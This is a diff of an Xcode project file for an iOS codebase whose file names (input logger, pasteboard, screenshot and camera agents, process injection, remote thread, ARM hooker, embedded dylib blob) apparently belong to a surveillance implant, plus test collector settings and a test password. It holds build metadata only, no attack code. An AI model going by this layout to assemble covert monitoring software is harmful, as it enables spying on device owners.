@@ -144,6 +144,8 @@
 		5231D311153573DD00257253 /* RCSIAgentManager.mm in Sources */ = {isa = PBXBuildFile; fileRef = 5231D310153573DD00257253 /* RCSIAgentManager.mm */; };
 		5231D31415357F7F00257253 /* RCSIThreadSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 5231D31315357F7F00257253 /* RCSIThreadSupport.m */; };
 		52337D90150E57E3003F0269 /* RCSIEventScreensaver.m in Sources */ = {isa = PBXBuildFile; fileRef = 52337D8F150E57E3003F0269 /* RCSIEventScreensaver.m */; };
+		5233A623156F7180008D80D0 /* RCSIDylibBlob.m in Sources */ = {isa = PBXBuildFile; fileRef = 52965492155D580F00AED90A /* RCSIDylibBlob.m */; };
+		5233A627156F71E7008D80D0 /* dylib.ios in Resources */ = {isa = PBXBuildFile; fileRef = 52F2B80814F67D6C00AB51B2 /* dylib.ios */; };
 		5234E9CA11C13C97002FFF39 /* Message.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5234E9C911C13C97002FFF39 /* Message.framework */; };
 		523CDB801488EF6D00A7947E /* RCSIAgentCamera.mm in Sources */ = {isa = PBXBuildFile; fileRef = 523CDB7F1488EF6D00A7947E /* RCSIAgentCamera.mm */; };
 		5240A957151F743B0009F337 /* NSData+SHA1.m in Sources */ = {isa = PBXBuildFile; fileRef = 52815C9A13253438004E5138 /* NSData+SHA1.m */; };
@@ -154,7 +156,9 @@
 		524349AE1501238D00841ECF /* RCSIEventACPower.m in Sources */ = {isa = PBXBuildFile; fileRef = 524349AD1501238D00841ECF /* RCSIEventACPower.m */; };
 		5243B2E5151E7FAB00F82CF2 /* 48.jpg in Resources */ = {isa = PBXBuildFile; fileRef = 5243B2E4151E7FAB00F82CF2 /* 48.jpg */; };
 		524C8423150F5786005113A0 /* RCSIEventSimChange.m in Sources */ = {isa = PBXBuildFile; fileRef = 524C8422150F5786005113A0 /* RCSIEventSimChange.m */; };
-		5264A9D815109CB000A4D90D /* RCSILoader.mm in Sources */ = {isa = PBXBuildFile; fileRef = 5264A9D715109CB000A4D90D /* RCSILoader.mm */; };
+		5255E2BE1589D4F900CB47ED /* RCSIEventStandBy.m in Sources */ = {isa = PBXBuildFile; fileRef = 5255E2BD1589D4F900CB47ED /* RCSIEventStandBy.m */; };
+		5255E2C11589D53600CB47ED /* RCSIDylibEvents.m in Sources */ = {isa = PBXBuildFile; fileRef = 5255E2C01589D53600CB47ED /* RCSIDylibEvents.m */; };
+		5264A9D815109CB000A4D90D /* RCSIDylib.mm in Sources */ = {isa = PBXBuildFile; fileRef = 5264A9D715109CB000A4D90D /* RCSIDylib.mm */; };
 		5264A9E415109CE400A4D90D /* RCSIAgentApplication.m in Sources */ = {isa = PBXBuildFile; fileRef = 5264A9DB15109CE400A4D90D /* RCSIAgentApplication.m */; };
 		5264A9E515109CE400A4D90D /* RCSIAgentInputLogger.mm in Sources */ = {isa = PBXBuildFile; fileRef = 5264A9DD15109CE400A4D90D /* RCSIAgentInputLogger.mm */; };
 		5264A9E615109CE400A4D90D /* RCSIAgentPasteboard.m in Sources */ = {isa = PBXBuildFile; fileRef = 5264A9DF15109CE400A4D90D /* RCSIAgentPasteboard.m */; };
@@ -164,6 +168,7 @@
 		52682E6E149B413000CE9ADB /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1D30AB110D05D00D00671497 /* Foundation.framework */; };
 		52682E90149B418200CE9ADB /* CameraSupport.mm in Sources */ = {isa = PBXBuildFile; fileRef = 52682E8E149B418200CE9ADB /* CameraSupport.mm */; };
 		526EAEB0149B453700269BCF /* ARMHooker.mm in Sources */ = {isa = PBXBuildFile; fileRef = 1AAFAE401186DC99002AA6B7 /* ARMHooker.mm */; };
+		527E121A156CD53300CC84EF /* RCSIAgent.m in Sources */ = {isa = PBXBuildFile; fileRef = 52CAC4FB1535CB8800BD6F1C /* RCSIAgent.m */; };
 		52815C6C132531F5004E5138 /* AuthNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 52815C5A132531F5004E5138 /* AuthNetworkOperation.m */; };
 		52815C6D132531F5004E5138 /* ByeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 52815C5C132531F5004E5138 /* ByeNetworkOperation.m */; };
 		52815C6E132531F5004E5138 /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 52815C5E132531F5004E5138 /* ConfNetworkOperation.m */; };
@@ -195,11 +200,14 @@
 		528E640114F6A0C60064F398 /* SBJsonWriter.m in Sources */ = {isa = PBXBuildFile; fileRef = 528E63F514F6A0C60064F398 /* SBJsonWriter.m */; };
 		528E640514F6A1360064F398 /* RCSIJSonConfiguration.m in Sources */ = {isa = PBXBuildFile; fileRef = 528E640414F6A1360064F398 /* RCSIJSonConfiguration.m */; };
 		52926CC31551791A004588D7 /* 128.jpg in Resources */ = {isa = PBXBuildFile; fileRef = 52926CC21551791A004588D7 /* 128.jpg */; };
+		52965493155D580F00AED90A /* RCSIDylibBlob.m in Sources */ = {isa = PBXBuildFile; fileRef = 52965492155D580F00AED90A /* RCSIDylibBlob.m */; };
+		52965494155D5D9800AED90A /* RCSIDylibBlob.m in Sources */ = {isa = PBXBuildFile; fileRef = 52965492155D580F00AED90A /* RCSIDylibBlob.m */; };
 		529F6DBC1536EB43001F4CA2 /* RCSIThreadSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 5231D31315357F7F00257253 /* RCSIThreadSupport.m */; };
 		529F6DBD1536EB43001F4CA2 /* RCSIAgent.m in Sources */ = {isa = PBXBuildFile; fileRef = 52CAC4FB1535CB8800BD6F1C /* RCSIAgent.m */; };
 		529F6DBE1536EB43001F4CA2 /* RCSIAgentManager.mm in Sources */ = {isa = PBXBuildFile; fileRef = 5231D310153573DD00257253 /* RCSIAgentManager.mm */; };
 		52A661AA1330C88F00D2898D /* RCSIAgentDevice.m in Sources */ = {isa = PBXBuildFile; fileRef = 52A661A91330C88F00D2898D /* RCSIAgentDevice.m */; };
 		52BD26C1141103AE00E13352 /* libEventKit.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 52BD26C0141103AE00E13352 /* libEventKit.dylib */; };
+		52C9810E1581ED3B00D5291C /* RCSIThreadSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 5231D31315357F7F00257253 /* RCSIThreadSupport.m */; };
 		52CAC4FC1535CB8900BD6F1C /* RCSIAgent.m in Sources */ = {isa = PBXBuildFile; fileRef = 52CAC4FB1535CB8800BD6F1C /* RCSIAgent.m */; };
 		52F2B80A14F67D6C00AB51B2 /* UIKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A1D7CCB105A5C9F0098D4D5 /* UIKit.framework */; };
 		52F2B80B14F67D6C00AB51B2 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1D30AB110D05D00D00671497 /* Foundation.framework */; };
@@ -210,6 +218,13 @@
 
 /* Begin PBXContainerItemProxy section */
 		521C87031520AC390080D021 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 29B97313FDCFA39411CA2CEA /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 52F2B80714F67D6C00AB51B2;
+			remoteInfo = dylib;
+		};
+		5233A624156F719F008D80D0 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
 			containerPortal = 29B97313FDCFA39411CA2CEA /* Project object */;
 			proxyType = 1;
@@ -260,7 +275,7 @@
 		1AAFAE3F1186DC99002AA6B7 /* ARMHooker.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = ARMHooker.h; path = dylib/ARMHooker.h; sourceTree = "<group>"; };
 		1AAFAE401186DC99002AA6B7 /* ARMHooker.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = ARMHooker.mm; path = dylib/ARMHooker.mm; sourceTree = "<group>"; };
 		1AC0E2291056956E00DCFA55 /* RCSIMain.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIMain.m; sourceTree = "<group>"; };
-		1AC0E22F1056961000DCFA55 /* RCSICommon.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSICommon.h; sourceTree = "<group>"; };
+		1AC0E22F1056961000DCFA55 /* RCSICommon.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; lineEnding = 0; path = RCSICommon.h; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objcpp; };
 		1AC0E2301056961000DCFA55 /* RCSICommon.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSICommon.m; sourceTree = "<group>"; };
 		1AC0E2361056966A00DCFA55 /* RCSICore.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; lineEnding = 0; path = RCSICore.h; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objcpp; };
 		1AC0E2371056966A00DCFA55 /* RCSICore.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; lineEnding = 0; path = RCSICore.m; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objc; };
@@ -363,8 +378,12 @@
 		5243B2E4151E7FAB00F82CF2 /* 48.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = 48.jpg; sourceTree = "<group>"; };
 		524C8421150F5786005113A0 /* RCSIEventSimChange.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; lineEnding = 0; name = RCSIEventSimChange.h; path = Modules/RCSIEventSimChange.h; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objcpp; };
 		524C8422150F5786005113A0 /* RCSIEventSimChange.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; lineEnding = 0; name = RCSIEventSimChange.m; path = Modules/RCSIEventSimChange.m; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objc; };
-		5264A9D715109CB000A4D90D /* RCSILoader.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = RCSILoader.mm; path = dylib/RCSILoader.mm; sourceTree = SOURCE_ROOT; };
-		5264A9D915109CC200A4D90D /* RCSILoader.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSILoader.h; path = dylib/RCSILoader.h; sourceTree = SOURCE_ROOT; };
+		5255E2BC1589D4F900CB47ED /* RCSIEventStandBy.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIEventStandBy.h; path = dylib/Events/RCSIEventStandBy.h; sourceTree = SOURCE_ROOT; };
+		5255E2BD1589D4F900CB47ED /* RCSIEventStandBy.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIEventStandBy.m; path = dylib/Events/RCSIEventStandBy.m; sourceTree = SOURCE_ROOT; };
+		5255E2BF1589D53600CB47ED /* RCSIDylibEvents.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIDylibEvents.h; path = dylib/Events/RCSIDylibEvents.h; sourceTree = SOURCE_ROOT; };
+		5255E2C01589D53600CB47ED /* RCSIDylibEvents.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIDylibEvents.m; path = dylib/Events/RCSIDylibEvents.m; sourceTree = SOURCE_ROOT; };
+		5264A9D715109CB000A4D90D /* RCSIDylib.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = RCSIDylib.mm; path = dylib/RCSIDylib.mm; sourceTree = SOURCE_ROOT; };
+		5264A9D915109CC200A4D90D /* RCSIDylib.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIDylib.h; path = dylib/RCSIDylib.h; sourceTree = SOURCE_ROOT; };
 		5264A9DA15109CE400A4D90D /* RCSIAgentApplication.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentApplication.h; path = dylib/Agents/RCSIAgentApplication.h; sourceTree = SOURCE_ROOT; };
 		5264A9DB15109CE400A4D90D /* RCSIAgentApplication.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIAgentApplication.m; path = dylib/Agents/RCSIAgentApplication.m; sourceTree = SOURCE_ROOT; };
 		5264A9DC15109CE400A4D90D /* RCSIAgentInputLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentInputLogger.h; path = dylib/Agents/RCSIAgentInputLogger.h; sourceTree = SOURCE_ROOT; };
@@ -445,6 +464,8 @@
 		528E640314F6A1360064F398 /* RCSIJSonConfiguration.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIJSonConfiguration.h; path = Modules/SBJSon/RCSIJSonConfiguration.h; sourceTree = "<group>"; };
 		528E640414F6A1360064F398 /* RCSIJSonConfiguration.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIJSonConfiguration.m; path = Modules/SBJSon/RCSIJSonConfiguration.m; sourceTree = "<group>"; };
 		52926CC21551791A004588D7 /* 128.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = 128.jpg; sourceTree = "<group>"; };
+		52965491155D580F00AED90A /* RCSIDylibBlob.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSIDylibBlob.h; sourceTree = "<group>"; };
+		52965492155D580F00AED90A /* RCSIDylibBlob.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIDylibBlob.m; sourceTree = "<group>"; };
 		52A661A81330C88F00D2898D /* RCSIAgentDevice.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentDevice.h; path = Modules/Agents/RCSIAgentDevice.h; sourceTree = "<group>"; };
 		52A661A91330C88F00D2898D /* RCSIAgentDevice.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIAgentDevice.m; path = Modules/Agents/RCSIAgentDevice.m; sourceTree = "<group>"; };
 		52BD26C0141103AE00E13352 /* libEventKit.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libEventKit.dylib; path = Support/EventKit/libEventKit.dylib; sourceTree = "<group>"; };
@@ -566,7 +587,7 @@
 			path = Modules/Reachability;
 			sourceTree = "<group>";
 		};
-		1AC0E20F1056926900DCFA55 /* Sources */ = {
+		1AC0E20F1056926900DCFA55 /* Main */ = {
 			isa = PBXGroup;
 			children = (
 				1AC0E2291056956E00DCFA55 /* RCSIMain.m */,
@@ -576,7 +597,7 @@
 				1AC0E2301056961000DCFA55 /* RCSICommon.m */,
 				32CA4F630368D1EE00C91783 /* RCSIphone_Prefix.pch */,
 			);
-			name = Sources;
+			name = Main;
 			sourceTree = "<group>";
 		};
 		1AC0E2101056927500DCFA55 /* Support */ = {
@@ -591,6 +612,8 @@
 				1AAFAE401186DC99002AA6B7 /* ARMHooker.mm */,
 				520E0615126DCEFC00B4F4F0 /* RCSINotificationSupport.h */,
 				520E0616126DCEFC00B4F4F0 /* RCSINotificationSupport.m */,
+				52965491155D580F00AED90A /* RCSIDylibBlob.h */,
+				52965492155D580F00AED90A /* RCSIDylibBlob.m */,
 				1AC0E2601056976F00DCFA55 /* RCSISharedMemory.h */,
 				1AC0E2611056976F00DCFA55 /* RCSISharedMemory.m */,
 				1AEB952F138E53540057EB42 /* RCSILogger.h */,
@@ -699,7 +722,7 @@
 				1AC0E2101056927500DCFA55 /* Support */,
 				1AC0E2111056927A00DCFA55 /* Modules */,
 				1AC0E212105692A600DCFA55 /* Categories */,
-				1AC0E20F1056926900DCFA55 /* Sources */,
+				1AC0E20F1056926900DCFA55 /* Main */,
 			);
 			name = "ios-core";
 			sourceTree = "<group>";
@@ -814,6 +837,17 @@
 				5220196E1549832D00C4FB66 /* RCSIRemoteThread.s */,
 			);
 			name = Injection;
+			sourceTree = "<group>";
+		};
+		5255E2BB1589D47D00CB47ED /* Events */ = {
+			isa = PBXGroup;
+			children = (
+				5255E2BF1589D53600CB47ED /* RCSIDylibEvents.h */,
+				5255E2C01589D53600CB47ED /* RCSIDylibEvents.m */,
+				5255E2BC1589D4F900CB47ED /* RCSIEventStandBy.h */,
+				5255E2BD1589D4F900CB47ED /* RCSIEventStandBy.m */,
+			);
+			name = Events;
 			sourceTree = "<group>";
 		};
 		52682E70149B413000CE9ADB /* camera-dylib */ = {
@@ -964,9 +998,10 @@
 		52F2B80D14F67D6C00AB51B2 /* ios-dylib */ = {
 			isa = PBXGroup;
 			children = (
+				5255E2BB1589D47D00CB47ED /* Events */,
 				52FAE92B14FB89F0003D1527 /* Agents */,
-				5264A9D915109CC200A4D90D /* RCSILoader.h */,
-				5264A9D715109CB000A4D90D /* RCSILoader.mm */,
+				5264A9D915109CC200A4D90D /* RCSIDylib.h */,
+				5264A9D715109CB000A4D90D /* RCSIDylib.mm */,
 			);
 			path = "ios-dylib";
 			sourceTree = "<group>";
@@ -1029,6 +1064,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				5233A625156F719F008D80D0 /* PBXTargetDependency */,
 				525C36B21522EC7B004D4E65 /* PBXTargetDependency */,
 			);
 			name = "ios-test-app";
@@ -1113,6 +1149,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5233A627156F71E7008D80D0 /* dylib.ios in Resources */,
 				5217E0AC151E4A2C0011ED1E /* InfoPlist.strings in Resources */,
 				5217E0B9151E4A2D0011ED1E /* MainWindow_iPhone.xib in Resources */,
 				5217E0C0151E4A2D0011ED1E /* MainWindow_iPad.xib in Resources */,
@@ -1217,6 +1254,7 @@
 				52CAC4FC1535CB8900BD6F1C /* RCSIAgent.m in Sources */,
 				5220196D1549820000C4FB66 /* RCSIProcInjection.c in Sources */,
 				5220196F1549832D00C4FB66 /* RCSIRemoteThread.s in Sources */,
+				52965493155D580F00AED90A /* RCSIDylibBlob.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1224,6 +1262,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5233A623156F7180008D80D0 /* RCSIDylibBlob.m in Sources */,
 				52071405154AEF0500FB341F /* RCSIProcInjection.c in Sources */,
 				52071406154AEF0500FB341F /* RCSIRemoteThread.s in Sources */,
 				529F6DBC1536EB43001F4CA2 /* RCSIThreadSupport.m in Sources */,
@@ -1319,13 +1358,18 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				52C9810E1581ED3B00D5291C /* RCSIThreadSupport.m in Sources */,
+				527E121A156CD53300CC84EF /* RCSIAgent.m in Sources */,
+				52965494155D5D9800AED90A /* RCSIDylibBlob.m in Sources */,
 				5264A9E915109CFE00A4D90D /* RCSISharedMemory.m in Sources */,
-				5264A9D815109CB000A4D90D /* RCSILoader.mm in Sources */,
+				5264A9D815109CB000A4D90D /* RCSIDylib.mm in Sources */,
 				5264A9E415109CE400A4D90D /* RCSIAgentApplication.m in Sources */,
 				5264A9E515109CE400A4D90D /* RCSIAgentInputLogger.mm in Sources */,
 				5264A9E615109CE400A4D90D /* RCSIAgentPasteboard.m in Sources */,
 				5264A9E715109CE400A4D90D /* RCSIAgentScreenshot.m in Sources */,
 				5264A9E815109CE400A4D90D /* RCSIAgentURL.m in Sources */,
+				5255E2BE1589D4F900CB47ED /* RCSIEventStandBy.m in Sources */,
+				5255E2C11589D53600CB47ED /* RCSIDylibEvents.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1336,6 +1380,11 @@
 			isa = PBXTargetDependency;
 			target = 52F2B80714F67D6C00AB51B2 /* dylib */;
 			targetProxy = 521C87031520AC390080D021 /* PBXContainerItemProxy */;
+		};
+		5233A625156F719F008D80D0 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 52F2B80714F67D6C00AB51B2 /* dylib */;
+			targetProxy = 5233A624156F719F008D80D0 /* PBXContainerItemProxy */;
 		};
 		525C36B21522EC7B004D4E65 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
@@ -1401,7 +1450,7 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_DEVICE_ADDRESS = 10.0.2.6;
+				RCS_TEST_DEVICE_ADDRESS = 10.0.2.5;
 				RCS_TEST_INSTANCE = RCS_0000000978;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/kiodo/ios_debug;
@@ -1441,7 +1490,7 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_DEVICE_ADDRESS = 10.0.2.6;
+				RCS_TEST_DEVICE_ADDRESS = 10.0.2.5;
 				RCS_TEST_INSTANCE = RCS_0000000978;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/kiodo/ios_debug;
@@ -1632,7 +1681,7 @@
 				);
 				OTHER_LDFLAGS = (
 					"-init",
-					_RCSIInit,
+					_init,
 				);
 				PRECOMPS_INCLUDE_HEADERS_FROM_BUILT_PRODUCTS_DIR = NO;
 				PRODUCT_NAME = "$(TARGET_NAME)";
@@ -1669,7 +1718,7 @@
 				);
 				OTHER_LDFLAGS = (
 					"-init",
-					_RCSIInit,
+					_init,
 				);
 				PRECOMPS_INCLUDE_HEADERS_FROM_BUILT_PRODUCTS_DIR = NO;
 				PRODUCT_NAME = "$(TARGET_NAME)";
